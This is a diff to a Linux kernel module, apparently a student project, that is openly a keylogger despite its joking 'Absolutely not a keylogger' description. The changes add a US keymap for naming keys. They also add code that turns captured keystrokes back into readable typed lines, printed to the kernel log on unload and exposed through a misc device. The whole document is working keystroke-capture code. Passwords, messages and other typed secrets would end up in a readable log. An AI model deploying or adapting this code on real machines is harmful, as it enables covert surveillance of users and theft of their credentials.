@@ -5,7 +5,6 @@
 #include <linux/mutex.h>
 #include <linux/interrupt.h>
 #include <linux/keyboard.h>
-//#include "keymap.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Romain Kowalski");
@@ -15,14 +14,50 @@ MODULE_DESCRIPTION("Absolutely not a keylogger.");
 #define DEVICE_NAME "definitely_not_key_logs"
 #define PRESSED 1
 #define RELEASED 0
+#define LINE_SIZE 50
+#define FULL_NAME_SIZE 20
 
 static struct	key_stroke {
 	unsigned int		keycode;
-	char			value; // a virer ?
-	char			full_name[15];
+	unsigned char		keysym;
+	char			full_name[FULL_NAME_SIZE];
 	bool			pressed; // 1 = pressed, 0 = released
 	ktime_t			time;
 };
+
+static const char	*us_keymap[][2] = {
+	{"\0", "\0"}, {"ESCAPE", "ESCAPE"}, {"1", "!"}, {"2", "@"},
+	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},
+	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},
+	{"-", "_"}, {"=", "+"}, {"BACKSPACE", "BACKSPACE"}, {"TAB", "TAB"},
+	{"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
+	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},
+	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},
+	{"ENTER", "ENTER"}, {"CTRL L", "CTRL L"}, {"a", "A"}, {"s", "S"},
+	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},
+	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},
+	{"'", "\""}, {"`", "~"}, {"SHIFT L", "SHIFT L"}, {"\\", "|"},
+	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},
+	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},
+	{".", ">"}, {"/", "?"}, {"SHIFT R", "SHIFT R"}, {"KP *", "KP PRINT SCREEN"},
+	{"ALT L", "ALT L"}, {"SPACE", "SPACE"}, {"CAPS LOCK", "CAPS LOCK"},
+	{"F1", "F1"}, {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},
+	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"}, {"F10", "F10"},
+	{"NUM", "NUM"}, {"SCROLL", "SCROLL"}, {"KP 7", "HOME"},
+	{"KP 8", "KP UP"}, {"KP 9", "KP PAGE UP"}, {"-", "-"}, {"KP 4", "KP LEFT"},
+	{"KP 5", "KP 5"}, {"KP 6", "KP RIGHT"}, {"+", "+"}, {"KP 1", "KP END"},
+	{"KP 2", "KP DOWN"}, {"KP 3", "KP PAGE DOWN"}, {"KP 0", "KP INSERT"},
+	{"KP .", "KP DELETE"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, {"\0", "\0"},
+	{"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"}, {"\0", "\0"},
+	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
+	{"ENTER", "ENTER"}, {"CTRL R", "CTRL R"}, {"/", "/"}, {"PRTSCR", "PRTSCR"},
+	{"ALT R", "ALT R"}, {"\0", "\0"}, {"HOME", "HOME"}, {"UP", "UP"},
+	{"PAGE UP", "PAGE UP"}, {"LEFT", "LEFT"}, {"RIGHT", "RIGHT"},
+	{"END", "END"}, {"DOWN", "DOWN"}, {"PAGE DOWN", "PAGE DOWN"},
+	{"INSERT", "INSERT"}, {"DELETE", "DELETE"}, {"\0", "\0"}, {"\0", "\0"},
+	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
+	{"PAUSE", "PAUSE"},
+}; 
 
 static size_t			captured_size = 0;
 static size_t			captured_max_size = 0;
@@ -30,21 +65,6 @@ static struct key_stroke	*captured_keys = NULL;
 static char			*log_file = NULL;
 static struct mutex		log_mutex; // for log_file
 static struct mutex		keys_mutex; // for captured_keys
-
-static void	print_notifier_data(struct keyboard_notifier_param *param,
-					unsigned long action)
-{
-	char c;
-
-	c = param->value;
-	pr_info("stage: %ld\n", action);
-	pr_info("pressed: %d\n", param->down);
-	pr_info("shift: %d\n", param->shift);
-	pr_info("value(dec): %d", param->value	);
-	pr_info("key pressed (dec): %d", c);
-	pr_info("key pressed (hex): %#x", c);
-	pr_info("key pressed (ascii): %c", c);
-}
 
 static int	ktime_to_hours(ktime_t time)
 {
@@ -79,14 +99,14 @@ static void	key_stroke_to_buffer(struct key_stroke entry, char *buffer,
 	int	hours;
 	int	minutes;
 	int	seconds;
-	char	format[] = "[%2d:%02d:%02d] (%d) %s\n";
+	char	format[] = "[%2d:%02d:%02d] %s (%d) %s\n";
 	hours = ktime_to_hours(entry.time);
 	minutes = ktime_to_minutes(entry.time);
 	seconds = ktime_to_seconds(entry.time);
-	snprintf(buffer, len, format, hours, minutes, seconds, entry.keycode,
-				(entry.pressed ? "Pressed": "Released"));
+	snprintf(buffer, len, format, hours, minutes, seconds, entry.full_name,
+		entry.keycode, (entry.pressed ? "Pressed": "Released"));
 }
-// received first, it's where we create the key record
+
 static int	handle_keycode(struct keyboard_notifier_param *param)
 {
 	mutex_lock(&keys_mutex);
@@ -106,17 +126,23 @@ static int	handle_keycode(struct keyboard_notifier_param *param)
 	return (NOTIFY_OK);
 }
 
-/*static void	param_to_full_name(struct keyboard_notifier_param *param)
-{
-	if (is ascii)
-
-	else if (is 
-*/
-
 static int	handle_keysym(struct keyboard_notifier_param *param)
 {
+	char	c;
+	int	shift = 0;
+	if (param->shift == 1)
+		shift = 1;
+	c = param->value;
 	mutex_lock(&keys_mutex);
-	captured_keys[captured_size].value = param->value;
+	captured_keys[captured_size].keysym = c;
+	if (c >= 33 && c <= 126) {
+		snprintf(captured_keys[captured_size].full_name, FULL_NAME_SIZE,
+								"%c", c);
+	} else {
+		strscpy(captured_keys[captured_size].full_name,
+			us_keymap[captured_keys[captured_size].keycode][shift],
+			FULL_NAME_SIZE);
+	}
 	captured_size++;
 	mutex_unlock(&keys_mutex);
 	return (NOTIFY_OK);
@@ -127,9 +153,8 @@ static int	key_pressed(struct notifier_block *self, unsigned long action,
 {
 	if (action == KBD_KEYCODE)
 		return (handle_keycode(data));
-	else if (action == KBD_KEYSYM) {
+	else if (action == KBD_KEYSYM)
 		return (handle_keysym(data));
-	}
 	return (NOTIFY_DONE);
 }
 
@@ -138,6 +163,52 @@ static struct notifier_block	nb = {
 	.priority = 0,
 	.next = NULL,
 };
+
+static int	next_return(int start)
+{
+	while (start < captured_size && ((captured_keys[start].keycode != 96
+					&& captured_keys[start].keycode != 28)
+					|| !captured_keys[start].pressed))
+		start++;
+	return (start);
+}
+
+static void	fill_line(char *line, int start, int end)
+{
+	int	i = 0;
+	while (start < end) {
+		if (captured_keys[start].keysym >= 32
+				&& captured_keys[start].keysym <= 126
+				&& captured_keys[start].pressed) {
+			line[i] = captured_keys[start].keysym;
+			i++;
+		}
+		start++;
+	}
+	line[i] = '\0';
+}
+
+static void	print_readable(void)
+{
+	int	start = 0;
+	int	end = 0;
+	char	*line = NULL;
+	pr_info("Full readable logs:");
+	while (end < captured_size) {
+		end = next_return(start);
+		line = kmalloc(end - start + 1, GFP_KERNEL);
+		if (!line) {
+			pr_err("%s: kmalloc error", MODULE_NAME);
+			return ;
+		}
+		fill_line(line, start, end);
+		if (strlen(line))
+			pr_info("%s", line);
+		kfree(line);
+		end++;
+		start = end;
+	}
+}
 
 static ssize_t 	logs_read(struct file *filp, char __user *buffer, size_t len,
 							loff_t *offset)
@@ -154,7 +225,7 @@ static ssize_t 	logs_read(struct file *filp, char __user *buffer, size_t len,
 static int	logs_open(struct inode *inode, struct file *file)
 {
 	int	log_len;
-	char	line[30];
+	char	line[LINE_SIZE];
 	int	i;
 	try_module_get(THIS_MODULE);
 	mutex_lock(&log_mutex);
@@ -162,7 +233,7 @@ static int	logs_open(struct inode *inode, struct file *file)
 	log_len = 0;
 	i = 0;
 	while (i < captured_size) {
-		key_stroke_to_buffer(captured_keys[i], line, 30);
+		key_stroke_to_buffer(captured_keys[i], line, LINE_SIZE);
 		if (log_file)
 			log_len = strlen(log_file);
 		log_file = krealloc_array(log_file, log_len + strlen(line) + 1,
@@ -178,7 +249,6 @@ static int	logs_open(struct inode *inode, struct file *file)
 			strncat(log_file, line, strlen(line));
 		i++;
 	}
-	pr_info("Log file opened\n");
 	mutex_unlock(&log_mutex);
 	return (0);
 }
@@ -192,7 +262,6 @@ static int	logs_close(struct inode *inode, struct file *file)
 		mutex_unlock(&log_mutex);
 	}
 	module_put(THIS_MODULE);
-	pr_info("Log file closed");
 	return (0);
 }
 
@@ -238,6 +307,7 @@ static int	__init kl_init(void)
 
 static void	__exit kl_cleanup(void)
 {
+	print_readable();
 	misc_deregister(&logs_device);
 	kfree(log_file);
 	kfree(captured_keys);
